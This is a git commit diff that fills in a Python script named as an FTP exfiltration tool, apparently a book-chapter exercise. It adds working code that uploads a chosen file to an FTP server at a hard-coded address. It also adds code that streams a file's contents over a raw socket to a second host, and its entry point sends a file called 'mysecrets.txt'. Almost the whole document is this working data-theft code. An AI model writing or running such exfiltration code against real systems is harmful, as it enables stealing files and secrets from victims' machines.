99f61bdb94dbd5964a0eaf14b458ec55cd0ab866
zabumaphu@mgail.com <zabumaphu@mgail.com>
2023-06-02 22:33:21 -0400

    FTP exfiltrator started/

--- ch9/transmit_exfil.py
+++ ch9/transmit_exfil.py
@@ -4,16 +4,27 @@ Date: June 2, 2023
 Description: An exfiltration tool using FTP
 """
 
-import ftblib
+import ftplib
 import os
 import socket
 import win32file
 
 def plain_ftp(docpath, server='192.168.1.203'):
-    pass
+    ftp = ftplib.FTP(server)
+    ftp.login("anonymous", "anon@example.com")
+    ftp.cwd('/pub/')
+    ftp.storbinary("STOR " + os.path.basename(docpath), 
+                   open(docpath, 'rb'), 1024)
+    ftp.quit()
 
 def transmit(document_path):
-    pass
+    client = socket.socket()
+    client.connect(('192.168.1.207', 10000))
+    with open(document_path, 'rb') as f:
+        win32file.TransmitFile(
+            client,
+            win32file._get_osfhandle(f.fileno()),
+            0, 0, None, 0, b'', b'')
 
 if __name__ == "__main__":
-    pass
+    transmit('./mysecrets.txt')
